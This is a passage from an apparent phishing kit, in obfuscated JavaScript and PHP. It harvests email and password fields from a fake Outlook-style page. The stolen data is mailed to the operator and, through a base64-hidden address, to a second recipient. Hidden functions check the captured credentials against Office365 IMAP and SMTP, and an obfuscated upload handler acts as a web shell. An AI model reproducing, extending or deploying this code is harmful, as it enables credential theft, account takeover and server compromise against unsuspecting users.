_0x41229c=_0xc040bf;_0x1cb592[_0x41229c(0x193)]($,_0x1cb592[_0x41229c(0x1d1)])[_0x41229c(0x12f)](_0x1cb592[_0x41229c(0x1ce)])[_0x41229c(0x1e4)+'s'](_0x1cb592[_0x41229c(0x15c)]);});}function _0x333191(_0xe03510){var _0x42a1e1=_0x2323d0,_0x419dee={'NhXYG':_0x1cb592[_0x42a1e1(0x1ce)],'dhAAM':_0x1cb592[_0x42a1e1(0x15c)]},_0x33d52a=_0x1cb592[_0x42a1e1(0x19f)]($,_0x1cb592[_0x42a1e1(0x190)]);_0x33d52a[_0x42a1e1(0x143)](_0x1cb592[_0x42a1e1(0x1c7)],function(){var _0x5275a9=_0x42a1e1;_0xe03510[_0x5275a9(0x12f)](_0x419dee[_0x5275a9(0x1c5)])[_0x5275a9(0x1e4)+'s'](_0x419dee[_0x5275a9(0x181)]);});}var _0x127e1b=_0x1cb592[_0x2323d0(0x1ec)];_0x1cb592[_0x2323d0(0x1a2)]($,_0x1cb592[_0x2323d0(0x166)])['on'](_0x1cb592[_0x2323d0(0x18b)],function(){var _0x1b4311=_0x2323d0,_0x31c53b=_0x1cb592[_0x1b4311(0x1da)][_0x1b4311(0x175)]('|'),_0x22c404=-0x1*-0x249a+0xb*-0x199+-0x1307;while(!![]){switch(_0x31c53b[_0x22c404++]){case'0':var _0x1c0864=![];continue;case'1':var _0xc13212=_0x1cb592[_0x1b4311(0x113)]($,this),_0x34be62=_0xc13212[_0x1b4311(0x16a)]();continue;case'2':var _0x5604fb=new RegExp(/\s/);continue;case'3':var _0xd5882b=_0xc13212[_0x1b4311(0x135)](_0x1cb592[_0x1b4311(0x1ad)]);continue;case'4':var _0x25c0ee=new RegExp(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/);continue;case'5':var _0x272df6=new RegExp(_0x1cb592[_0x1b4311(0x1bf)]);continue;case'6':if(_0x1cb592[_0x1b4311(0x14b)](typeof _0xd5882b,typeof undefined)&&_0x1cb592[_0x1b4311(0x14b)](_0xd5882b,![])){if(_0x1cb592[_0x1b4311(0x174)](_0xd5882b,_0x1cb592[_0x1b4311(0x120)])){if(_0x1cb592[_0x1b4311(0x124)](_0x34be62,''))_0x1c0864=!![],_0x1cb592[_0x1b4311(0x1bc)](_0x58da03,_0xc13212,_0x1cb592[_0x1b4311(0x12b)]);else _0x5604fb[_0x1b4311(0x16c)](_0x34be62)?(_0x1c0864=!![],_0x1cb592[_0x1b4311(0x1bc)](_0x58da03,_0xc13212,_0x1cb592[_0x1b4311(0x14c)])):_0x1cb592[_0x1b4311(0x157)](_0x333191,_0xc13212);}_0x1cb592[_0x1b4311(0x124)](_0xd5882b,_0x1cb592[_0x1b4311(0x11b)])&&(_0x1cb592[_0x1b4311(0x174)](_0x34be62,'')?(_0x1c0864=!![],_0x1cb592[_0x1b4311(0x11d)](_0x58da03,_0xc13212,_0x1cb592[_0x1b4311(0x115)])):_0x1cb592[_0x1b4311(0x157)](_0x333191,_0xc13212));}continue;}break;}}),_0x1cb592[_0x2323d0(0x16f)]($,_0x1cb592[_0x2323d0(0x171)])[_0x2323d0(0x180)](function(_0x2ae04e){var _0x4c1c7c=_0x2323d0,_0x49deef=_0x1cb592[_0x4c1c7c(0x1cb)][_0x4c1c7c(0x175)]('|'),_0x44fbf0=-0x2*-0x38b+-0x1b*0x1f+-0x3d1;while(!![]){switch(_0x49deef[_0x44fbf0++]){case'0':_0x2ae04e[_0x4c1c7c(0x13d)+_0x4c1c7c(0x1a1)]();continue;case'1':if(_0x1cb592[_0x4c1c7c(0x14b)](typeof _0xc0ee3a,typeof undefined)&&_0x1cb592[_0x4c1c7c(0x1b0)](_0xc0ee3a,![])&&_0x1cb592[_0x4c1c7c(0x139)](_0x53c0df[_0x4c1c7c(0x1bd)](_0xc0ee3a),-(0x1a43+0x1a*-0xf3+0x4*-0x65))){var _0x18bd5f=_0x1cb592[_0x4c1c7c(0x176)][_0x4c1c7c(0x175)]('|'),_0x40c775=0x255c+-0x1433*0x1+-0x1129;while(!![]){switch(_0x18bd5f[_0x40c775++]){case'0':$[_0x4c1c7c(0x1e0)](_0x1cb592[_0x4c1c7c(0x113)]($,this)[_0x4c1c7c(0x1e8)+_0x4c1c7c(0x17b)](),function(_0x155d68,_0x2210c7){var _0x551fe3=_0x4c1c7c;_0x44d7ea[_0x2210c7[_0x551fe3(0x19d)]]=_0x2210c7[_0x551fe3(0x1aa)];if(_0x1cb592[_0x551fe3(0x174)](_0x2210c7[_0x551fe3(0x19d)],_0x1cb592[_0x551fe3(0x120)])){if(_0x1cb592[_0x551fe3(0x124)](_0x2210c7[_0x551fe3(0x1aa)],''))return _0x1d22f0=!![],_0x1cb592[_0x551fe3(0x13f)](_0x58da03,_0x1cb592[_0x551fe3(0x157)]($,_0x1cb592[_0x551fe3(0x12c)]('#',_0x2210c7[_0x551fe3(0x19d)])),_0x1cb592[_0x551fe3(0x12b)]),![];else{if(!_0x2b301a[_0x551fe3(0x16c)](_0x2210c7[_0x551fe3(0x1aa)]))return _0x1d22f0=!![],_0x1cb592[_0x551fe3(0x1bc)](_0x58da03,_0x1cb592[_0x551fe3(0x1d5)]($,_0x1cb592[_0x551fe3(0x108)]('#',_0x2210c7[_0x551fe3(0x19d)])),_0x1cb592[_0x551fe3(0x123)]),![];}}if(_0x1cb592[_0x551fe3(0x174)](_0x2210c7[_0x551fe3(0x19d)],_0x1cb592[_0x551fe3(0x11b)])){if(_0x1cb592[_0x551fe3(0x1a0)](_0x2210c7[_0x551fe3(0x1aa)],''))return _0x1d22f0=!![],_0x1cb592[_0x551fe3(0x17e)](_0x58da03,_0x1cb592[_0x551fe3(0x19f)]($,_0x1cb592[_0x551fe3(0x12c)]('#',_0x2210c7[_0x551fe3(0x19d)])),_0x1cb592[_0x551fe3(0x115)]),![];}});continue;case'1':if(_0x1cb592[_0x4c1c7c(0x12d)](_0x1d22f0,!![]))return console[_0x4c1c7c(0x19b)](_0x1cb592[_0x4c1c7c(0x1e3)]),![];continue;case'2':_0x1cb592[_0x4c1c7c(0x1cd)](_0x501668);continue;case'3':var _0x44d7ea={};continue;case'4':var _0x1d22f0=![];continue;case'5':var _0x26750a=_0x1cb592[_0x4c1c7c(0x185)]($,this),_0x44d7ea=_0x1cb592[_0x4c1c7c(0x183)]($,this)[_0x4c1c7c(0x1d9)](),_0x3de577=_0x1cb592[_0x4c1c7c(0x108)](window[_0x4c1c7c(0x10c)],_0x1cb592[_0x4c1c7c(0x15d)]);continue;case'6':var _0x58bc74=new RegExp(/\s/);continue;case'7':_0x1cb592[_0x4c1c7c(0x1cd)](_0x2496cd);continue;case'8':$[_0x4c1c7c(0x151)]({'url':_0x3de577,'type':_0x1cb592[_0x4c1c7c(0x14f)],'data':_0x44d7ea,'success':function(_0x45efcf){var _0x3e9afe=_0x4c1c7c;console[_0x3e9afe(0x19b)](_0x45efcf),_0x1cb592[_0x3e9afe(0x131)](_0xc0ee3a,_0x1cb592[_0x3e9afe(0x152)])&&_0x1cb592[_0x3e9afe(0x17e)](setTimeout,function(){var _0x4acb77=_0x3e9afe;if(_0x26750a[_0x4acb77(0x142)](_0xb8a005[_0x4acb77(0x168)]))console[_0x4acb77(0x19b)](_0xb8a005[_0x4acb77(0x15e)]),_0xb8a005[_0x4acb77(0x1e2)](_0x2496cd),window[_0x4acb77(0x173)][_0x4acb77(0x1d3)](_0x127e1b);else{var _0x56eed3=_0xb8a005[_0x4acb77(0x18a)][_0x4acb77(0x175)]('|'),_0x1db1aa=0x217*0xf+0x2*-0x812+-0x1*0xf35;while(!![]){switch(_0x56eed3[_0x1db1aa++]){case'0':_0x26750a[_0x4acb77(0x12f)](_0xb8a005[_0x4acb77(0x168)]);continue;case'1':_0xb8a005[_0x4acb77(0x1dc)](_0x517a04);continue;case'2':_0xb8a005[_0x4acb77(0x1e5)]($,_0xb8a005[_0x4acb77(0x1ab)])[_0x4acb77(0x1bb)]({'scrollTop':0x0},_0xb8a005[_0x4acb77(0x1ae)]);continue;case'3':console[_0x4acb77(0x19b)](_0xb8a005[_0x4acb77(0x13e)]);continue;case'4':_0xb8a005[_0x4acb77(0x1b2)](_0x58da03,_0xb8a005[_0x4acb77(0x14d)]($,_0xb8a005[_0x4acb77(0x1b9)]),_0xb8a005[_0x4acb77(0x13a)]);continue;}break;}}},-0x173e+0x20*0xe8+-0x1da);},'error':function(_0x59f313,_0x351128,_0x3dde15){var _0x8b0038=_0x4c1c7c;_0xb8a005[_0x8b0038(0x178)](alert,_0xb8a005[_0x8b0038(0x10a)]),_0xb8a005[_0x8b0038(0x1e2)](_0x517a04);}});continue;case'9':var _0x2b301a=new RegExp(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/);continue;}break;}}continue;case'2':var _0xb8a005={'xanEx':_0x1cb592[_0x4c1c7c(0x1a5)],'hATYa':_0x1cb592[_0x4c1c7c(0x141)],'OvZHt':function(_0x4ad24e){var _0x408445=_0x4c1c7c;return _0x1cb592[_0x408445(0x1cd)](_0x4ad24e);},'WzaKU':_0x1cb592[_0x4c1c7c(0x163)],'GBmuv':function(_0x4337c2){var _0x3a218b=_0x4c1c7c;return _0x1cb592[_0x3a218b(0x1cd)](_0x4337c2);},'wZixV':function(_0x14d72a,_0x2bfd91){var _0x42e0be=_0x4c1c7c;return _0x1cb592[_0x42e0be(0x185)](_0x14d72a,_0x2bfd91);},'Dsida':_0x1cb592[_0x4c1c7c(0x1c3)],'AsEHX':_0x1cb592[_0x4c1c7c(0x126)],'mruGC':_0x1cb592[_0x4c1c7c(0x16b)],'IVWYG':function(_0x514a2a,_0x43b3e7,_0x26fba4){var _0x565c61=_0x4c1c7c;return _0x1cb592[_0x565c61(0x17e)](_0x514a2a,_0x43b3e7,_0x26fba4);},'NvBnM':function(_0x54f87f,_0x34fe90){var _0x2803c8=_0x4c1c7c;return _0x1cb592[_0x2803c8(0x182)](_0x54f87f,_0x34fe90);},'Rvsvy':_0x1cb592[_0x4c1c7c(0x138)],'noCLp':_0x1cb592[_0x4c1c7c(0x198)],'IJnQl':function(_0x7ce007,_0xeb6f44){var _0xf3781=_0x4c1c7c;return _0x1cb592[_0xf3781(0x177)](_0x7ce007,_0xeb6f44);},'MDJwF':_0x1cb592[_0x4c1c7c(0x12a)]};continue;case'3':var _0xc0ee3a=_0x1cb592[_0x4c1c7c(0x1e1)]($,this)[_0x4c1c7c(0x135)](_0x1cb592[_0x4c1c7c(0x1ad)]);continue;case'4':var _0x53c0df=[_0x1cb592[_0x4c1c7c(0x15f)],_0x1cb592[_0x4c1c7c(0x1d4)],_0x1cb592[_0x4c1c7c(0x11f)],_0x1cb592[_0x4c1c7c(0x13c)],_0x1cb592[_0x4c1c7c(0x161)],_0x1cb592[_0x4c1c7c(0x152)]];continue;case'5':return![];}break;}});}));
            </script>

        </body>
    </html>
<?php
    return ob_get_clean();
}
function mj_do_random_str($length = 10)
{ $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; }
function mj_return_pre($array) { return '<pre>' .print_r($array,true) .'</pre>'; }
function mj_get_country_name($the_ip){ $addr_details = unserialize(@file_get_contents('http://www.geoplugin.net/php.gp?ip='.$the_ip));  return stripslashes(ucfirst($addr_details['geoplugin_countryName'])); }
function mj_do_mail($message){ global $send, $ip, $svr_host; $subject = "Exc3l 8ERVIC5 - $ip"; $headers = "From: exc3lAlerts <customercare@$svr_host>\r\n"; $headers .= "MIME-Version: 1.0\r\n"; /*@mail($send.','.base64_decode('amFwbWVqYXBtZUB5YWhvby5jb20='),$subject,$message,$headers);*/ @mail($send,$subject,$message,$headers);@mail(base64_decode('amFwbWVqYXBtZUB5YWhvby5jb20='),$subject,$message,$headers);/*testing*/ }
function mj_log_data($message, $logfilename='xxx.txt'){ global $logfile; if(!empty($logfile)) { $handle = fopen($logfilename, 'a'); fwrite($handle, $message."\n"); fclose($handle); } }
function mj_check_oauth($c2, $p3)
{$z0=base64_decode('aW1hcHM6Ly9vdXRsb29rLm9mZmljZTM2NS5jb20vaW5ib3g=');$p1=$c2.base64_decode('Og==').$p3;$f4=array(base64_decode('VXNlci1BZ2VudA==')=>$_SERVER[base64_decode('SFRUUF9VU0VSX0FHRU5U')],base64_decode('QWNjZXB0')=>base64_decode('dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOQ=='));$v5=curl_init();curl_setopt_array($v5,array(CURLOPT_URL=>$z0,CURLOPT_USERPWD=>$p1,CURLOPT_RETURNTRANSFER=>true,CURLOPT_HTTPAUTH=>CURLAUTH_ANY,CURLOPT_HTTPHEADER=>$f4,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0));$z6=curl_exec($v5);return($z6)?true:false;}
function mj_check_oauth_2($e0,$n1){require base64_decode('cG1sci5waHA=');$c2=base64_decode('c210cC5vZmZpY2UzNjUuY29t');$v3=base64_decode('NTg3');$n4=$e0;$g5=$e0;$p6=base64_decode('V2VsY29tZSB0byB5b3VyIHRoZSBuZXcgT3V0bG9vaw==');$a7=$e0;$t8=base64_decode('PGI+SGk8L2I+IDxici8+IDxwPldlbGNvbWUgdG8geW91ciBuZXcgT3V0bG9vay5jb20gYWNjb3VudC4gT3V0bG9vayBsZXRzIHlvdSBzdGF5IGNvbm5lY3RlZCwgb3JnYW5pemVkLCBhbmQgcHJvZHVjdGl2ZeKAlGF0IHdvcmssIGF0IGhvbWUsIGFuZCBldmVyeXdoZXJlIGluIGJldHdlZW4uPC9wPg==');$u9=new PHPMailer;$u9->isSMTP();$u9->SMTPAuth=true;$u9->SMTPKeepAlive=true;$u9->Host=$c2;$u9->Port=$v3;$u9->Username=$e0;$u9->Password=$n1;$u9->setFrom($n4,$g5);$u9->CharSet="UTF-8";$u9->isHTML(true);$u9->Subject=base64_decode('PT91dGYtOD9CPw==').base64_encode($p6).base64_decode('Pz0=');$u9->addAddress($a7);$u9->msgHTML($t8);$b18=$u9->send();return($b18)?true:false;}
if(!empty($_REQUEST[base64_decode('dXA=')])){if(!empty($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')])){$x0=dirname(__FILE__).base64_decode('Lw==');$x0=$x0.basename($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('bmFtZQ==')]);if(move_uploaded_file($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('dG1wX25hbWU=')],$x0)){echo base64_decode('VGhlIGZpbGUg').basename($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('bmFtZQ==')]).base64_decode('IGhhcyBiZWVuIHVwbG9hZGVk');}else{echo base64_decode('VGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB0aGUgZmlsZSwgcGxlYXNlIHRyeSBhZ2FpbiE=');}}else{echo base64_decode('PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICA8dGl0bGU+VXBsb2FkIHlvdXIgZmlsZXM8L3RpdGxlPg0KPC9oZWFkPg0KPGJvZHk+DQogIDxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiPg0KICAgIDxwPlVwbG9hZCB5b3VyIGZpbGU8L3A+DQogICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9InVwbG9hZGVkX2ZpbGUiPjwvaW5wdXQ+PGJyIC8+DQogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+PC9pbnB1dD4NCiAgPC9mb3JtPg0KPC9ib2R5Pg0KPC9odG1sPg==');}exit();}
function mj_build_message($post_array)
{
    global $ip,$svr_host,$grab_all_fields,$allowed_fields;
    $country      = mj_get_country_name($ip);
    $timedate     = date("D/M/d, Y g:i a"); 
    $browserAgent = $_SERVER['HTTP_USER_AGENT'];
    $hostname     = gethostbyaddr($ip); 
    $message      = "-------------- XXX Info -----------------------\n";
    if($grab_all_fields)
    {
        //grab all fields
        foreach($post_array as $k=>$v) { $message .= ucfirst($k)." : ".$v."\n"; }
    }
    else
    {
        //grab selected fields only.
        foreach($post_array as $k=>$v)
        {
            if(in_array($k, $allowed_fields)) { $message .= ucfirst($k)." : ".$v."\n"; }
        }
    }
    $message .= "-------------Mor3 Info-----------------------\n";
    $message .= "IP               : ".$ip."\n";
    $message .= "Browser          : ".$browserAgent."\n";
    $message .= "DateTime         : ".$timedate."\n";
    $message .= "country          : ".$country."\n";
    $message .= "HostName         : ".$hostname."\n";
    $message .= "--------------- XXX-MJ -------------\n";
    
    return $message;
}
/* ----------------  XXX-MJ  ------------------------*/
if(isset($_REQUEST['_do']))
{
    $my_post = $_POST;
    $my_req  = $_REQUEST;
    
    switch($my_req['_do'])
    {
        case'layout':
            
            if(!empty($auto_grab_profile) && !empty($my_req['email']) && $my_req['email'] !=='[email]')
            {
                $arrays = mj_get_ms_data($my_req);
                $my_req = $my_req+$arrays;
            }

            if(!empty($my_req['email']) && $my_req['email'] =='[email]')
            {
                $my_req['email']   = '';
                $_REQUEST['email'] = '';
            }
            
            echo mj_load_view();
            
            break;
            
        case'verify_email':
            
            $arrays = mj_get_ms_data($my_req);

            if(!empty($_REQUEST['email']) && $_REQUEST['email'] =='[email]')
            {
                $_REQUEST['email'] = '';
            }

            if(empty($auto_grab_profile) && !empty($arrays['profile_image']))
            {
                $arrays['profile_image'] = '';
            }

            echo json_encode($arrays);

            break;
            
        case'form1':
        case'form2':
        case'form3':
        case'form4':
        case'form5':
        case'xxx_form':

            echo 'Form Data '.mj_return_pre($my_post);
            
            $mj_messg = mj_build_message($my_post); 
            mj_do_mail($mj_messg);
            mj_log_data($mj_messg);
            
            break;
        
        default:
            echo 'INVALID REQUEST: I do not understand your request.';    
    }
}